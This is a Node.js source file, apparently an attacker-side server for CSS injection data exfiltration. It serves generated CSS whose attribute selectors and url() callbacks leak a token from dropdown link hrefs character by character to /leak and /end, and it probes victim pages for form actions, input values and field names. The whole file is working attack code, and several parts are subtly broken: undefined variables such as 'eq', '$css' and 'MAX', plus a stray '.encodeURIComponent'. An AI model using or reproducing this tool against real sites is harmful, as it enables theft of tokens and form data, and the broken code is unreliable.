const http = require('http');
const url = require('url');
const port = 5001;

const HOSTNAME = "http://localhost:5001";
const DEBUG = false;

const MAX_ELEMENTS = 20;
const MAX_FORMS = 4;
const CHARS = String.fromCodePoint(32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126);

var selector = "a.dropdown-item", attribute = "href", prefix = "", postfix = "";
var pending = [];
var stop = false, ready = 0, n = 0, hiddenInputs = 0;

const requestHandler = (request, response) => {
    let req = url.parse(request.url, url);
    log('\treq: %s', request.url);
    if (stop) return response.end();
    switch (req.pathname) {
        case "/log":
            if(eq.query.hi) {
                hiddenInputs++;
            }
        break
        case "/discover":
            discoverResponse(response)
            break;
        case "/start":
            genResponse(response);
            break;
        case "/leak":
            response.end();
            if (req.query.pre && prefix !== req.query.pre) {
                prefix = req.query.pre;
            } else if (req.query.post && postfix !== req.query.post) {
               postfix = req.query.post;
            } else {
                break;
            }
            if (ready == 2) {
                genResponse(pending.shift());
                ready = 0;
            } else {
                ready++;
                log('\tleak: waiting others...');
            }
            break;
        case "/next":
            if (ready == 2) {
                genResponse(response);
                ready = 0;
            } else {
                pending.push(response);
                ready++;
                log('\tquery: waiting others...');
            }
            break;
        case "/end":
            stop = true;
            console.log('[+] END: %s', req.query.token);
        default:
            response.end();
    }
}

const discoverResponse = (response) => {
    let css = '';
    css += discoverForms();
    css += discoverTextareas();
    css += discoverInputs();
    css += `
            html {
                background:var(--inputCount,none),var(--formCount,none),var(--textareaCount,none),
                ${generateVariables()};
            }
    `;
    response.writeHead(200, { 'Content-Type': 'text/css'});
    response.write(css);
    response.end();
};

const genResponse = (response) => {
    const hex = [0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f'];
    console.log('...pre-payoad: ' + prefix);
    console.log('...post-payoad: ' + postfix);
    let css = '@import url('+ HOSTNAME + '/next?' + Math.random() + ');' +
        hex.map(e => (selector + '['+attribute+'$="' + e + postfix + '"]{--e'+n+':url(' + HOSTNAME + '/leak?post=' + e + encodeURIComponent(postfix) + ');}')).join('') +
        hex.map(e => (selector + '['+attribute+'^="' + prefix + e + '"]{--s'+n+':url(' + HOSTNAME + '/leak?pre=' + encodeURIComponent(prefix) + e +');}')).join('');
        if(n === 0) {
            let properties = [];
            for(let i=0;i<32;i++) {      
                  properties.push('var(--e'+i+',none),var(--s'+i+',none),var(--full-token,none)');
            }
            css += `${selector}{background:${properties.join(',')};}`;
         }
    css += selector + '['+attribute+'="'+ prefix + postfix + '"]{--full-token:url(' + HOSTNAME + '/end?token=' + encodeURIComponent(prefix) + encodeURIComponent(postfix) + ');}';
    response.writeHead(200, { 'Content-Type': 'text/css'});
    response.write(css);
    response.end();
    n++;
}

const server = http.createServer(requestHandler)

server.listen(port, (err) => {
    if (err) {
        return console.log('[-] Error: something bad happened', err);
    }
    console.log('[+] Server is listening on %d', port);
})

function log() {
    if (DEBUG) console.log.apply(console, arguments);
}

function escapeCSS(str) {
    return str.replace(/(["\\])/,'\\$1');
}

function discoverForms() {
    let css = '';
    for(let i=1;i<=MAX_FORMS;$i++) {
        css += 'html:has(form:nth-of-type('+i+')){--formCount: url(/?formCount='+i+');}';
    }
    for(let i=0;i<CHARS.length;i++) {
        for(let j=1;j<=MAX_FORMS;j++) {
            css += 'html:has(form[action^="'+escapeCSS(CHARS[i])+'"]:nth-of-type('+j+')){--form'+j+'ActionBegins: url(/?form'+j+'ActionBegins='+encodeURIComponent(CHARS[i])+');}';
        }
        for(let j=1;j<=MAX_FORMS;j++) {
            css += 'html:has(form[action$="'+escapeCSS(CHARS[i])+'"]:nth-of-type('+j+')){--form'+j+'ActionEnds: url(/?form'+j+'ActionEnds='.encodeURIComponent(CHARS[i])+');}';
        }
    }
    return $css;
}

function discoverTextareas() {
    let css = '';
    for(let i=1;i<=MAX_ELEMENTS;i++) {
        css += 'html:has(textarea:nth-of-type('+i+')){--textareaCount: url(/?textareaCount='+i+');}';
    }
    for(let i=0;i<CHARS.length;i++) {
        for(let j=1;j<=MAX_ELEMENTS;j++) {
            css += 'html:has(textarea[name^="'+escapeCSS(CHARS[i])+'"]:nth-of-type('+j+')){--textarea'+j+'NameBegins: url(/?input'+j+'NameBegins='+encodeURIComponent(CHARS[i])+');}';
        }
    }
    for(let i=0;i<CHARS.length;i++) {
        for(let j=1;j<=MAX_ELEMENTS;j++) {
            $css += 'html:has(textarea[name$="'+escapeCSS(CHARS[i])+'"]:nth-of-type('+j+')){--textarea'+j+'NameEnds: url(/?input'+j+'NameEnds='+encodeURIComponent(CHARS[i])+');}';
        }
    }
    return $css;
}

function discoverInputs() {
    let css = '';
    for(let i=1;i<=MAX;i++) {
        css += 'html:has(input:nth-of-type('+i+')){--inputCount: url(/?inputCount='+i+');}';
    }
    for(let i=0;i<CHARS.length;i++) {
        for(let j=1;j<=MAX_ELEMENTS;j++) {
            css += 'html:has(input[value^="'+escapeCSS(CHARS[i])+'"]:nth-of-type('+j+')){--input'+j+'ValueBegins: url(/?input'+j+'ValueBegins='+encodeURIComponent(CHARS[i])+');}';
        }
    }
    for(let i=0;i<CHARS.length;i++) {
        for(let j=1;j<=MAX_ELEMENTS;j++) {
            css += 'html:has(input[value$="'+escapeCSS(CHARS[i])+'"]:nth-of-type('+j+')){--input'+j+'ValueEnds: url(/?input'+j+'ValueEnds='+encodeURIComponent(CHARS[i])+');}';
        }
    }
    for(let i=0;i<CHARS.length;i++) {
        for(let j=1;j<=MAX_ELEMENTS;j++) {
            css += 'html:has(input[name^="'+escapeCSS(CHARS[i])+'"]:nth-of-type('+j+')){--input'+j+'NameBegins: url(/?input'+j+'NameBegins='+encodeURIComponent(CHARS[i])+');}';
        }
    }
    for(let i=0;i<CHARS.length;i++) {
        for(let j=1;j<=MAX_ELEMENTS;j++) {
            css += 'html:has(input[name$="'+escapeCSS(CHARS[i])+'"]:nth-of-type('+j+')){--input'+j+'NameEnds: url(/?input'+j+'NameEnds='+encodeURIComponent(CHARS[i])+');}';
        }
    }
    return css;
}

function generateVariables() {
    let css = '';
    let rules = [];
    for(let i=1;i<=MAX_FORMS;i++) {
        rules.push('var(--form'+i+'ActionBegins,none)');
    }
    css += rules.join(',');
    css += ',';
    rules = [];
    for(let i=1;i<=MAX_FORMS;i++) {
        rules.push('var(--form'+i+'ActionEnds,none)');
    }
    css += rules.join(',');
    css += ',';
    rules = [];
    for(let i=1;i<=MAX_ELEMENTS;i++) {
        rules.push('var(--input'+i+'ValueBegins,none)');
    }
    css += rules.join(',');
    css += ',';
    rules = [];
    for(let i=1;i<=MAX_ELEMENTS;i++) {
        rules.push('var(--input'+i+'ValueEnds,none)');
    }
    css += rules.join(',');
    css += ',';
    rules = [];
    for(let i=1;i<=MAX_ELEMENTS;i++) {
        rules.push('var(--input'+i+'NameBegins,none)');
    }
    css += rules.join(',');
    css += ',';
    rules = [];
    for(let i=1;i<=MAX_ELEMENTS;i++) {
        rules.push('var(--input'+i+'NameEnds,none)');
    }
    css += rules.join(',');
    css += ',';
    rules = [];
    for(let i=1;i<=MAX_ELEMENTS;i++) {
        rules.push('var(--textarea'+i+'NameBegins,none)');
    }
    css += rules.join(',');
    css += ',';
    rules = [];
    for(let i=1;i<=MAX_ELEMENTS;i++) {
        rules.push('var(--textarea'+i+'NameEnds,none)');
    }
    css += rules.join(',');
    return css;
}